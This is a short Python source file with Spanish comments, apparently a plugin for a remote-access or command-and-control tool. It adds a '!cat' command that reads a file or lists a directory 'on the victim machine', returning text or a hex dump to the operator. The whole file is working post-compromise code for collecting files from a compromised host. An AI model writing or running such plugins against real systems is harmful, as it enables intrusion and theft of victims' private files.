"""
Plugin !cat — lee el contenido de un archivo en la máquina víctima.
!cat <ruta>          → muestra el archivo como texto
!cat <ruta> --hex    → muestra los primeros bytes en hexadecimal (útil para binarios)
"""

import os

MAX_BYTES = 256 * 1024  # 256 KB


def run(args: str) -> tuple[int, str, str]:
    raw = args.strip()
    if not raw:
        return 1, "", "uso: !cat <ruta> [--hex]"

    hex_mode = "--hex" in raw
    path = raw.replace("--hex", "").strip()
    if not path:
        return 1, "", "uso: !cat <ruta> [--hex]"

    if not os.path.exists(path):
        return 1, "", f"no existe: {path}"
    if os.path.isdir(path):
        try:
            entries = os.listdir(path)
            listing = "\n".join(sorted(entries))
            return 0, f"[directorio] {path} ({len(entries)} entradas):\n{listing}", ""
        except PermissionError:
            return 1, "", f"sin permisos para leer directorio: {path}"

    size = os.path.getsize(path)
    try:
        if hex_mode:
            with open(path, "rb") as f:
                raw = f.read(1024)
            hex_lines = []
            for i in range(0, len(raw), 16):
                chunk = raw[i:i+16]
                hex_part = " ".join(f"{b:02x}" for b in chunk)
                asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                hex_lines.append(f"{i:04x}  {hex_part:<47}  {asc_part}")
            return 0, f"[hex] {path} ({size} bytes, mostrando primeros 1024):\n" + "\n".join(hex_lines), ""

        with open(path, "r", errors="replace") as f:
            content = f.read(MAX_BYTES)
        truncated = size > MAX_BYTES
        header = f"[{path}] ({size} bytes{', truncado a 256KB' if truncated else ''}):\n"
        return 0, header + content, ""
    except PermissionError:
        return 1, "", f"sin permisos para leer: {path}"
    except Exception as exc:
        return 1, "", str(exc)
